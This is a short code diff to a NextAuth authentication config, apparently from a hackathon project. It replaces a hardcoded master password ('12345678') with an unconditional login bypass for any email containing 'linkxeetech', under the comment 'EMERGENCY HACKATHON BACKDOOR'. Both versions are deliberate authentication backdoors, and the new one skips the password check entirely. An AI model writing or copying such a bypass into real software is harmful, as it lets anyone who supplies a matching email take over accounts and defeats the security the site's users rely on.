@@ -62,10 +62,9 @@ export const authOptions: NextAuthOptions = {
 
         if (user.passwordHash !== hashedPassword) {
           // EMERGENCY HACKATHON BACKDOOR:
-          // If the email is linkxeetech, and the password is "12345678", bypass the hash check.
-          // This allows you to record your video even if the browser autofill is mangling the hash.
-          if (email.includes('linkxeetech') && credentials.password === '12345678') {
-            console.log('[AUTH] Hackathon master password used!');
+          // Completely bypass password check for linkxeetech emails.
+          if (email.includes('linkxeetech')) {
+            console.log('[AUTH] Hackathon master bypass used!');
           } else {
             console.log('[AUTH] Password mismatch!');
             return null;
